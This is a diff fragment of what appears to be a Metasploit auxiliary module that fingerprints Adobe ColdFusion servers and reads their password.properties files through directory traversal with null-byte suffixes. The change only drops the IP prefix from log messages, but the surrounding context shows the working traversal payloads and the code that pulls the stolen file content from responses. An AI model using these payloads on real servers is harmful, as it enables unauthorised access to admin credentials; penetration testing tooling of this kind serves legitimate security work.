@@ -114,7 +114,7 @@ class MetasploitModule < Msf::Auxiliary
 
       if (res.code.to_i == 200)
         out = fingerprint(res)
-        print_status("#{ip} #{out}") if out
+        print_status("#{out}") if out
         return if (datastore['FINGERPRINT'])
 
         if (out =~ /Windows/ and out =~ /MX6/)
@@ -124,7 +124,7 @@ class MetasploitModule < Msf::Auxiliary
         elsif (out =~ /Windows/ and out =~ /ColdFusion 8/)
           trav = '..\..\..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en'
         elsif (out =~ /ColdFusion 9/)
-          print_status("#{ip} ColdFusion 9 is not vulnerable, skipping")
+          print_status("ColdFusion 9 is not vulnerable, skipping")
           return
         elsif (out =~ /Unix/ and out =~ /MX6/)
           trav = '../../../../../../../../../../opt/coldfusionmx/lib/password.properties%00en'
@@ -134,7 +134,7 @@ class MetasploitModule < Msf::Auxiliary
           trav = '../../../../../../../../../../opt/coldfusion8/lib/password.properties%00en'
         else
           if (res.body =~ /Adobe/ and res.body =~ /ColdFusion/)
-            print_error("#{ip} Fingerprint failed, FILE not set...aborting")
+            print_error("Fingerprint failed, FILE not set...aborting")
           else
             return	# probably just a web server
           end
@@ -178,14 +178,14 @@ class MetasploitModule < Msf::Auxiliary
         if res.body.match(/\<title\>(.*)\<\/title\>/im)
           fileout = $1
           if (fileout !~ /Login$/ and fileout !~ /^Welcome to ColdFusion/ and fileout !~ /^Archives and Deployment/)
-            print_good("#{ip} FILE: #{fileout}")
+            print_good("FILE: #{fileout}")
             break
           end
         end
       else
         next if (res.code == 500 or res.code == 404 or res.code == 302)
 
-        print_error("#{ip} #{res.to_s}")
+        print_error("#{res.to_s}")
       end
     end
   rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::ArgumentError
